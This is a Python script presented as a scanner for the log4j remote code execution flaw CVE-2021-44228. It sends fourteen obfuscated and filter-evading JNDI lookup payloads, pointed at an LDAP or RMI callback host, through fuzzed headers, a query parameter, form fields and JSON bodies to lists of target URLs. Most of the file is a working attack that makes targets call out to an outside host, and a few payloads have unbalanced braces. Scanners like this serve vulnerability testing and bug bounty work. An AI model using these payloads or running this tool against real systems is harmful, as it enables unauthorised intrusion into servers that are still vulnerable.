#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-bypass: A generic scanner for Apache log4j RCE CVE-2021-44228
# Created by Megan Howell (CyberQueenMeg)
# ******************************************************************

import argparse
import random
import requests
import time
import sys
from urllib import parse as urlparse
import base64
import json
import random
from uuid import uuid4
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from termcolor import cprint
from concurrent.futures import ThreadPoolExecutor


# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


cprint('[•] CVE-2021-44228 - Apache Log4j RCE Exception Scanner', "green")
cprint('[•] Scanner provided by CyberQueenMeg', "yellow")


if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)


default_headers = {
    'User-Agent': '[Bug Bounty] CyberQueenMeg',
    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}
post_data_parameters = ["username", "user", "email", "email_address", "password", "search"]
timeout = 4


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs. - default urls.txt",
                    default="urls.txt",
                    action='store')
parser.add_argument("--headers-file",
                    dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].",
                    default="headers.txt",
                    action='store')
parser.add_argument("--wait-time",
                    dest="wait_time",
                    help="Wait time after all URLs are processed (in seconds) - [Default: 60].",
                    default=60,
                    type=int,
                    action='store')
parser.add_argument("--callback-url",
                    dest="custom_dns_callback_host",
                    help="Custom DNS Callback Host.",
                    action='store')
parser.add_argument("--threads",
                    dest="threads",
                    help="Num threads for concurrent scanning - [Default: 30].",
                    default=30,
                    type=int,
                    action='store')


args = parser.parse_args()


proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}

def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open(args.headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})

    fuzzing_headers["Referrer"] = f'https://{fuzzing_headers["Referrer"]}'
    return fuzzing_headers


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data

def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})



def scan_url(url, callback_host):
    cprint(f"[•] URL: {url}", "green")
    parsed_url = parse_url(url)
    payload0 = "${jndi:ldap://"+callback_host+"]"
    payload1 = "{${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://"+callback_host+"}"
    payload2 = "${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://"+callback_host+"}"
    payload3 = "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://"+callback_host+"}"
    payload4 = "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://"+callback_host+"}"
    payload5 = "${${::-j}ndi:rmi://"+callback_host+"}"
    payload6 = "${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}"+callback_host+"}"
    payload7 = "${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://"+callback_host+"}"
    payload8 = "${\u006a\u006e\u0064\u0069:ldap://"+callback_host+"}"
    payload9 = "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//"+callback_host+"}"
    payload10 = "${jndi:ldap://127.0.0.1#"+callback_host+"}" #2.15 bypass
    payload11 = "${jnd${sys:SYS_NAME:-i}:ldap:/"+callback_host+"}"
    payload12 = "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://"+callback_host+"}"
    payload13 = "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://"+callback_host+"}"
    payloads = [payload0, payload1, payload2, payload3, payload4, payload5, payload6, payload7, payload8, payload9, payload10, payload11, payload12, payload13]
    for payload in payloads:
        cprint(f"[•] PAYLOAD: {payload}", "cyan")
        try:
            requests.request(url=url,
                                method="GET",
                                params={"v": payload},
                                headers=get_fuzzing_headers(payload),
                                verify=False,
                                timeout=timeout,
                                allow_redirects=True,
                                proxies=proxies)

        except Exception as e:
            cprint(f"EXCEPTION: {e}")

        try:
            # Post body
            requests.request(url=url,
                                method="POST",
                                params={"v": payload},
                                headers=get_fuzzing_headers(payload),
                                data=get_fuzzing_post_data(payload),
                                verify=False,
                                timeout=timeout,
                                allow_redirects=True,
                                proxies=proxies)
        except Exception as e:
            cprint(f"EXCEPTION: {e}")

        try:
            # JSON body
            requests.request(url=url,
                                method="POST",
                                params={"v": payload},
                                headers=get_fuzzing_headers(payload),
                                json=get_fuzzing_post_data(payload),
                                verify=False,
                                timeout=timeout,
                                allow_redirects=True,
                                proxies=proxies)
        except Exception as e:
            cprint(f"EXCEPTION: {e}")


def main():
    urls = []

    cprint(f"[•] Using [{args.custom_dns_callback_host}] for DNS callback.", "cyan")
    callback_host =  args.custom_dns_callback_host

    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)


    cprint("[%] Checking for Log4j RCE CVE-2021-44228 and bypasses.", "magenta")
    with ThreadPoolExecutor(args.threads) as exe:
        for url in urls:
            exe.submit(scan_url, url, callback_host)

    if args.custom_dns_callback_host:
        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
        return


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
